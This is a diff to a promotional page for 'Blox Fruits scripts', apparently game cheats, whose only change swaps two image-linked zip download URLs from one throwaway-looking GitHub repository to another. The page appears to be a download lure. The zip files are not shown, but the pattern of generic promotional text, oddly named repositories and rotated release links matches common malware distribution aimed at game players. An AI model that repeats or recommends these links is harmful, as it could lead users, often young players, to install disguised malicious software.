@@ -5,10 +5,10 @@
 In this comprehensive guide, we’ll explore **Blox Fruits scripts**, explain how they work, the benefits of using them, and how you can utilize them to improve your **Blox Fruits** experience. Whether you’re a newbie or an experienced player, this guide will help you get the most out of **Blox Fruits scripts** in 2025.
 
 [![image](https://github.com/user-attachments/assets/c2c76d38-17eb-42c0-8042-5bf1c445cd14)
-](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
+](https://github.com/Gqdqw/potential-guacamole/releases/download/new/Script.New.Version.zip)
 
 [![be2727eb-5ae9-45d3-93cf-3c14393e4ada](https://github.com/user-attachments/assets/6a671348-0bac-4085-8a6f-70ea3ce48872)
-](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
+](https://github.com/Gqdqw/potential-guacamole/releases/download/new/Script.New.Version.zip)
 
 
 ---
